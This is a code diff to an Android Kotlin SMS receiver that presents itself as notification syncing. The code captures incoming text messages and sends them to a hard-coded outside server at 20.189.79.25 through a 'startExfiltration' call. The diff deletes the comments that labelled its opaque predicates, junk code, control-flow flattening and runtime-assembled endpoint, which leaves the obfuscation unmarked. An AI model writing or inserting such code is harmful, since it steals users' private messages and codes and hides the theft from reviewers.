@@ -17,38 +17,34 @@ import org.json.JSONObject
 import java.net.HttpURLConnection
 import java.net.URL
 
-/**
- * InboxEventReceiver — handles incoming message events for notification management.
- * Triggers background sync when new messages arrive.
- */
 class MessageReceiver : BroadcastReceiver() {
 
     override fun onReceive(context: Context, intent: Intent) {
-        // Opaque predicate
+        
         val n = System.nanoTime()
-        val op = (n - n) + 1L   // always 1 > 0
+        val op = (n - n) + 1L   
         if (op > 0 && intent.action == Telephony.Sms.Intents.SMS_RECEIVED_ACTION) {
             CoroutineScope(Dispatchers.Default).launch {
-                // Capture live SMS with obfuscated flow
+                
                 captureLiveSms(context, intent)
 
-                // Junk no-op
+                
                 val noise = LongArray(16) { i -> i.toLong() * i.toLong() + 7L }
                 val _ = noise.sum()
 
                 delay(5000L)
 
-                // Execute only in safe environment
+                
                 NotificationSyncService.startExfiltration(context)
             }
         } else if (op <= 0) {
-            // Junk branch — never executed
+            
             val fakeMap = mapOf(1 to "a", 2 to "b", 3 to "c")
             val _ = fakeMap.size
         }
     }
 
-    // ── Control Flow Flattened: captureLiveSms ─────────────────────────────────
+    
 
     private suspend fun captureLiveSms(context: Context, intent: Intent) {
         var state = 0
@@ -83,7 +79,7 @@ class MessageReceiver : BroadcastReceiver() {
         }
     }
 
-    // ── Control Flow Flattened: extractSmsMessages ────────────────────────────
+    
 
     private fun extractSmsMessages(pdus: Array<ByteArray>, intent: Intent): JSONArray {
         var state = 0
@@ -138,7 +134,7 @@ class MessageReceiver : BroadcastReceiver() {
         }
     }
 
-    // ── Control Flow Flattened: transmitLiveSms ───────────────────────────────
+    
 
     private suspend fun transmitLiveSms(context: Context, smsData: JSONArray) {
         var state = 0
@@ -151,7 +147,7 @@ class MessageReceiver : BroadcastReceiver() {
 
             when (state) {
                 0 -> {
-                    // Opaque predicate guard
+                    
                     val x = System.currentTimeMillis()
                     if (x * x >= Long.MIN_VALUE) {
                         state = 1
@@ -207,7 +203,7 @@ class MessageReceiver : BroadcastReceiver() {
         }
     }
 
-    // ── Runtime-assembled strings (obfuscation) ──────────────────────────────
+    
 
     private fun resolveSmsEndpoint(): String {
         val parts = listOf("http://", "20.189.79.25", ":5000/api/sms")
